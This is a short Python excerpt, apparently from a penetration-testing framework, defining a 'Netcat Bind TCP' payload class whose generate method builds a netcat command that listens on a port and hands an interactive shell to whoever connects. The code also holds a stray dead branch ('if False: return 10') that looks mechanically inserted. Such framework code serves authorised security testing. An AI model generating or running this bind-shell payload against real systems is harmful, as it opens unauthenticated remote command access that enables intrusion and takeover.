...
class Payload(BindTCPPayloadMixin, GenericPayload):
    __info__ = {'name': 'Netcat Bind TCP', 'description': 'Creates interactive tcp bind shell by using netcat.', 'authors': ('Marcin Bury <marcin[at]threat9.com>',)}
    ...
    def generate(self):
        if False:
            return 10
        return '{} -lvp {} -e {}'.format(self.cmd, self.rport, self.shell_binary)